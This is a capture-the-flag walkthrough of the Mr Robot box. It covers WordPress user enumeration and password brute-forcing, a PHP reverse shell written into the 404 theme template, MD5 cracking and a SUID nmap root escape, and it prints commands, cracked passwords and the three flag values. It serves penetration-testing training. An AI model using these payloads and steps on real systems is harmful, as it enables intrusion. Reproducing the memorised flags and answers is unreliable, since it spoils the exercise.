Mr Robot CTF

Medium web wordpress linux suid

A classic Mr Robot-themed box. Enumerate a WordPress site, brute-force credentials with a wordlist handed to us by the machine itself, drop a reverse shell into a template file, crack an MD5 hash, then exploit an old nmap binary with the SUID bit set to land root — all while collecting three keys along the way.

01 Reconnaissance

Full TCP scan with service detection and default scripts:

nmap -sC -sV -p- -T4 10.10.X.X -oN nmap.txt

Only three ports of interest come back — SSH is closed, and the web stack is live on both HTTP and HTTPS:

PORT    STATE  SERVICE   VERSION
22/tcp  closed ssh
80/tcp  open   http      Apache httpd
443/tcp open   ssl/http  Apache httpd

The site at port 80 is a full-screen interactive Mr Robot terminal — cute, but nothing exploitable in the source. Time to directory-brute with Gobuster:

gobuster dir -u http://10.10.X.X/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html -t 40 -o gobuster.txt

A few interesting hits show up — most notably /robots.txt, /wp-login.php, and /license.

02 Key 1 — robots.txt

curl http://10.10.X.X/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt

Two files, straight up. Grab both:

curl http://10.10.X.X/key-1-of-3.txt
wget http://10.10.X.X/fsocity.dic

Key 1: 073403c8a58a1f80d943455fb30724b9

The fsocity.dic file is a wordlist — but full of duplicates. De-dupe before using it or you'll waste hours:

wc -l fsocity.dic            # ~858160 lines
sort -u fsocity.dic -o fsocity.sorted.dic
wc -l fsocity.sorted.dic      # ~11451 lines

03 WordPress brute-force

WordPress's login page leaks valid usernames: if the username exists, the error message says "the password you entered for the username X is incorrect", otherwise it says "invalid username". We can use that to enumerate users via wpscan — but faster, the fsocity dictionary itself contains the username. Try the obvious one:

curl -s -c /dev/null -X POST \
  -d "log=Elliot&pwd=whatever&wp-submit=Log+In" \
  http://10.10.X.X/wp-login.php | grep -oE "(Invalid username|incorrect)"

Response contains "incorrect" — Elliot is a valid user. Now brute the password:

wpscan --url http://10.10.X.X \
  --usernames Elliot \
  --passwords fsocity.sorted.dic \
  --max-threads 40

After a few minutes:

[SUCCESS] - Elliot / ER28-0652
If wpscan is slow on your box, hydra works too: hydra -l Elliot -P fsocity.sorted.dic 10.10.X.X http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect"

04 Foothold — reverse shell

Login at /wp-login.php as Elliot:ER28-0652. WordPress gives admin access — we can abuse the theme editor to write PHP directly to disk.

Navigate to Appearance → Editor and open 404.php (any template that's easy to trigger works — 404 is convenient because any invalid URL renders it). Replace the whole file with a PHP reverse shell. I use a trimmed pentestmonkey variant:

<?php
set_time_limit(0);
$ip   = '10.X.X.X';     // your tun0 IP
$port = 4444;
$sock = fsockopen($ip, $port);
$desc = array(0 => $sock, 1 => $sock, 2 => $sock);
$proc = proc_open('/bin/sh -i', $desc, $pipes);
proc_close($proc);
?>

Save. In another terminal, start a listener:

nc -lnvp 4444

Trigger the template by visiting any URL that 404s:

curl http://10.10.X.X/404-trigger

Shell lands as daemon. Upgrade to a proper TTY immediately — you'll need it for su later:

python -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
# then in shell:
export TERM=xterm
stty rows 38 columns 116

05 Key 2 — hash cracking

cd /home
ls
# robot
cd robot && ls -la
-r-------- 1 robot robot  33 key-2-of-3.txt
-r--r--r-- 1 robot robot  39 password.raw-md5

key-2-of-3.txt is not readable by daemon, but password.raw-md5 is world-readable:

cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

Crack it — rockyou has it, but CrackStation is instant. With hashcat:

echo 'c3fcd3d76192e4007dfb496cca67e13b' > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

Plaintext: abcdefghijklmnopqrstuvwxyz — literally the lowercase alphabet.

su robot
# password: abcdefghijklmnopqrstuvwxyz
cat key-2-of-3.txt

Key 2: 822c73956184f694993bede3eb39f959

06 Key 3 — SUID nmap privesc

Enumerate SUID binaries:

find / -perm -4000 -type f 2>/dev/null
/usr/local/bin/nmap
/bin/ping
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
...

/usr/local/bin/nmap is the tell — old nmap versions (≤ 5.21) shipped an interactive mode that spawns a shell inheriting SUID privileges. Check the version:

nmap --version
Nmap version 3.81

Perfect, well within the vulnerable range. Drop into interactive mode and escape to a shell:

nmap --interactive
nmap> !sh
# whoami → root

And the last flag:

cat /root/key-3-of-3.txt

Key 3: 04787ddef27c3dee1ee161b21670b4e4

07 Wrap-up

The whole chain:

  1. Found wordlist + first key in robots.txt.
  2. De-duped the dictionary, confirmed Elliot as valid user via login error message.
  3. Brute-forced the WP password with wpscan — ER28-0652.
  4. Edited the 404 theme file to drop a PHP reverse shell, triggered it with a 404.
  5. Cracked robot's MD5 hash → user 2 flag.
  6. Abused SUID nmap --interactive to escape to a root shell → user 3 flag.

Takeaways: always de-dupe found wordlists, always check WP login error messages for enum oracles, and always check SUID binary versions — old nmap and find -exec are classics for a reason.
